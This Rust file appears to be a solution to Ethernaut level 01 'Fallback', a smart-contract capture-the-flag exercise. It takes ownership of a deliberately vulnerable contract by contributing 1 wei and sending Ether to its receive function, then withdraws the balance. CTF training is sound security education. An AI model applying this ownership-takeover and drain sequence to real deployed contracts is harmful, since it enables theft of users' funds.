//! Ethernaut level 01 — Fallback.
//!
//! Goal: Take ownership of `Fallback`, an Ether contribution contract, and reduce its Ether balance to zero.
//!
//! Source: [local](../../../../lib/ethernaut/contracts/src/levels/Fallback.sol) · [pinned upstream](https://github.com/OpenZeppelin/ethernaut/blob/d05643a40aa98c45d66247c69ffceab8f44dd8cb/contracts/src/levels/Fallback.sol).
//! Challenge: [local](../../../../lib/ethernaut/client/src/gamedata/en/descriptions/levels/fallback.md) · [pinned upstream](https://github.com/OpenZeppelin/ethernaut/blob/d05643a40aa98c45d66247c69ffceab8f44dd8cb/client/src/gamedata/en/descriptions/levels/fallback.md).
//! [Factory success check](../../../../lib/ethernaut/contracts/src/levels/FallbackFactory.sol) · [Rust bindings](ctf::ethereum::ethernaut::lvl01_fallback).
//!
//! `target` contains the deployed instance address and any level-specific helpers.
//! `offender` is your player account; sign transactions with `offender.address()`.

use alloy::primitives::U256;
use async_trait::async_trait;
use ctf::Actor;
use ctf::ethereum::ethernaut::lvl01_fallback::*;

pub struct Exploit;

#[async_trait]
impl ctf::Exploit for Exploit {
    type Target = Target;

    async fn attack(
        self,
        target: &Target,
        offender: &Actor,
    ) -> eyre::Result<()> {
        let contract =
            Fallback::new(target.address, offender.provider().clone());

        println!("Calling contribute()...");
        contract
            .contribute()
            .value(U256::from(1))
            .from(offender.address())
            .send()
            .await?
            .watch()
            .await?;

        println!("Calling receive()...");
        offender.transfer(target.address, U256::from(1)).await?;

        println!("Calling withdraw()...");
        contract
            .withdraw()
            .from(offender.address())
            .send()
            .await?
            .watch()
            .await?;

        Ok(())
    }
}
